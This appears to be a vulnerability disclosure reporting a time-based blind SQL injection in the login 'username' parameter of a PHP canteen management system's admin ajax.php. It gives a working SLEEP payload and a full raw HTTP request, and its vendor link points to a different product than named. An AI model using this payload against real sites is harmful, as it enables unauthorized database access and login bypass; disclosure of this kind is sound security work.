# Canteen Management System  has SQL injection

BUG_Author: Pass-A
vendors:[https://www.sourcecodester.com/php/15688/canteen-management-system-project-source-code-php.html](https://www.sourcecodester.com/php/16166/online-pizza-ordering-system-php-free-source-code.html)

Vulnerability File: /php-opos/admin/ajax.php

Parameter " username" (POST), exists delayed injection vulnerability
Payload1: username=admin' AND (SELECT 9075 FROM (SELECT(SLEEP(5)))VBYO)-- jlcs&password=admin123

```
POST http://10.168.66.54/php-opos/admin/ajax.php?action=login HTTP/1.1
Host: 10.168.66.54
Content-Length: 86
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://10.168.66.54
Referer: http://10.168.66.54/php-opos/admin/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=dk2dlf34s71cmm52dto2b8ru43
Connection: close

username=admin' AND (SELECT 9075 FROM (SELECT(SLEEP(5)))VBYO)-- jlcs&password=admin123
```



sleep(5)，The server response time is 5 seconds

![image](https://user-images.githubusercontent.com/28854626/219555215-9001ac27-742e-491d-b40f-5d1081a4965d.png)


![image](https://user-images.githubusercontent.com/28854626/219557423-481e8886-6191-46d0-b0c3-bda43ffb7ca4.png)
